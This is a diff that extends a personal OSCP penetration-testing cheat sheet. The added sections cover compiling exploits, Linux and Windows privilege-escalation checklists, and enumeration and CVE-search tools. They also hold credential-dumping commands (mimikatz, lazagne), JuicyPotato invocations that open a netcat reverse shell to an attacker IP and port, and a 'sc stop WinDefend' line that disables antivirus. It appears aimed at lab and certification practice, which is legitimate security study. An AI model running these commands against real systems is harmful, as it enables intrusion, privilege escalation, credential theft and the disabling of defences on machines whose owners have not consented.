@@ -103,15 +103,23 @@ description: "OSCP personal cheat sheet"
   * [Connecting](#connecting)
 - [CGI](#cgi)
   * [Found CGI scripts](#found-cgi-scripts)
+- [Compiling exploits](#compiling-exploits)
+  * [For linux](#for-linux)
+  * [For windows](#for-windows)
+  * [Cross compile](#cross-compile)
 - [DICTIONARY GENERATION](#dictionary-generation)
 - [FILE TRANSFER](#file-transfer)
   * [Linux](#linux-2)
   * [Windows](#windows-2)
+- [GIT](#git)
+  * [Download .git](#download-git)
+  * [Extract .git content](#extract-git-content)
 - [HASHES](#hashes)
   * [Windows](#windows-3)
   * [Linux](#linux-3)
 - [MIMIKATZ](#mimikatz)
 - [MISCELLANEOUS](#miscellaneous)
+  * [Get a Windows path without spaces](#get-a-windows-path-without-spaces)
 - [MSFVENOM PAYLOAD](#msfvenom-payload)
   * [Linux](#linux-4)
   * [Windows](#windows-4)
@@ -139,9 +147,25 @@ description: "OSCP personal cheat sheet"
 - [PRIVILE ESCALATION](#privile-escalation)
   * [Linux](#linux-5)
     + [Enumeration scripts](#enumeration-scripts)
+  * [Vulnerability scan](#vulnerability-scan)
+  * [Suid checker](#suid-checker)
+  * [Methodology to follow](#methodology-to-follow)
   * [Windows](#windows-5)
-  * [Enumeration scripts](#enumeration-scripts-1)
-  * [JuicyPotato](#juicypotato)
+    + [Enumeration scripts](#enumeration-scripts-1)
+      - [General scans](#general-scans)
+      - [Search for CVE](#search-for-cve)
+      - [Post exploitation](#post-exploitation)
+    + [JuicyPotato (SeImpersonate or SeAssignPrimaryToken)](#juicypotato--seimpersonate-or-seassignprimarytoken-)
+  * [Methodology to follow](#methodology-to-follow-1)
+    + [CVE](#cve)
+      - [Windows XP](#windows-xp)
+      - [Windows 7](#windows-7)
+      - [Windows 8](#windows-8)
+      - [Windows 10](#windows-10)
+      - [Windows Server 2003](#windows-server-2003)
+- [PROOFS](#proofs)
+  * [Linux](#linux-6)
+  * [Windows](#windows-6)
 - [REVERSE SHELL](#reverse-shell)
   * [Bash](#bash-1)
   * [Perl](#perl-1)
@@ -152,9 +176,15 @@ description: "OSCP personal cheat sheet"
   * [Adjust Interactive shell](#adjust-interactive-shell)
 - [SHELLSHOCK](#shellshock)
 - [USEFUL LINUX COMMANDS](#useful-linux-commands)
+  * [Find a file](#find-a-file)
+  * [Active connection](#active-connection)
+  * [List all SUID files](#list-all-suid-files)
+  * [Determine the current version of Linux](#determine-the-current-version-of-linux)
+  * [Determine more information about the environment](#determine-more-information-about-the-environment)
+  * [List processes running](#list-processes-running)
+  * [List the allowed (and forbidden) commands for the invoking use](#list-the-allowed--and-forbidden--commands-for-the-invoking-use)
 - [USEFUL WINDOWS COMMANDS](#useful-windows-commands)
 - [ZIP](#zip)
-  * [Brute force](#brute-force-10)
 
 ------
 
@@ -941,6 +971,38 @@ If a script is found try [SHELLSHOCK](#shellshock).
 
 ------
 
+## Compiling exploits
+
+### For linux
+
+```
+# 64 bits
+gcc -o exploit exploit.c
+
+# 32 bits
+gcc -m32 -o exploit exploit.c
+```
+
+### For windows
+
+```
+To compile Win32 bit executables, execute i686-w64-mingw32-gcc -o <FILE.exe> <FILE.c>
+To compile Win64 bit executables, execute x86_64-w64-mingw32-gcc -o <FILE.exe><FILE.c>
+To Compiled .cpp source file, execute i586-mingw32msvc-g++ -o <FILE>.exe <FILE>.cpp
+To compile python scripts, pyinstaller --onefile <SCRIPT.py>
+
+# Compile windows .exe on Linux
+i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
+```
+
+### Cross compile
+
+```
+gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
+```
+
+------
+
 ## DICTIONARY GENERATION
 
 ```
@@ -1254,20 +1316,108 @@ bash les.sh
 
 ```
 python suid3num.py
+
+https://gtfobins.github.io/
+```
+
+### Methodology to follow
+
+```
+https://guif.re/linuxeop
+```
+
+```
+sudo -l
+Kernel Exploits
+OS Exploits
+Password reuse (mysql, .bash_history, 000- default.conf...)
+Known binaries with suid flag and interactive (nmap)
+Custom binaries with suid flag either using other binaries or with command execution
+Writable files owned by root that get executed (cronjobs)
+MySQL as root
+Vulnerable services (chkrootkit, logrotate)
+Writable /etc/passwd
+Readable .bash_history
+SSH private key
+Listening ports on localhost
+/etc/fstab
+/etc/exports
+/var/mail
+Process as other user (root) executing something you have permissions to modify
+SSH public key + Predictable PRNG
+apt update hooking (PreInvoke)
 ```
 
 ### Windows
 
 #### Enumeration scripts
 
+##### General scans
+
+```
+winPEAS.exe
+windows-privesc-check2.exe
+powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+Powerless.bat
+winPEAS.bat
+```
+
+##### Search for CVE
+
+```
+systeminfo > systeminfo.txt
+python windows-exploit-suggester.py --update
+python windows-exploit-suggester.py --database <DATE>-mssb.xlsx --systeminfo systeminfo.txt
+
+systeminfo > systeminfo.txt
+wmic qfe > qfe.txt
+python wes.py -u
+python wes.py systeminfo.txt qfe.txt
+
+powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"
+```
+
+##### Post exploitation
+
+```
+lazagne.exe all
+SharpWeb.exe
+mimikatz.exe
+```
+
+#### JuicyPotato (SeImpersonate or SeAssignPrimaryToken)
+
+```
+If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.
+
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t *
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t * -c <CLSID>
+
+# CLSID
+https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+```
+
+### Methodology to follow
+
+```
+https://guif.re/windowseop
+
+https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
+http://www.fuzzysecurity.com/tutorials/16.html
 ```
 
 ```
-
-#### JuicyPotato
-
-```
-
+Kernel Exploits 
+OS Exploits 
+Pass The Hash 
+Password reuse 
+DLL hijacking (Path) 
+Vulnerable services 
+Writable services binaries path 
+Unquoted services 
+Listening ports on localhost 
+Registry keys
 ```
 
 #### CVE
@@ -1343,6 +1493,22 @@ https://github.com/abatchy17/WindowsExploits
 | :-----------: | ------------------------------------------------------------ |
 | CVE-2008-4250 | ms08_067_netapi  - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX |
 | CVE-2017-8487 | allows an attacker to execute code when a victim opens a specially crafted file - remote code execution |
+
+------
+
+## PROOFS
+
+### Linux
+
+```
+echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
+```
+
+### Windows
+
+```
+echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
+```
 
 ------
 
@@ -1478,13 +1644,14 @@ dir /s pass == cred == vnc == .config
 findstr /si password *.xml *.ini *.txt
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
+
+# Disable windows defender
+sc stop WinDefend
 ```
 
 ------
 
 ## ZIP
-
-### Brute force
 
 ```
 fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip
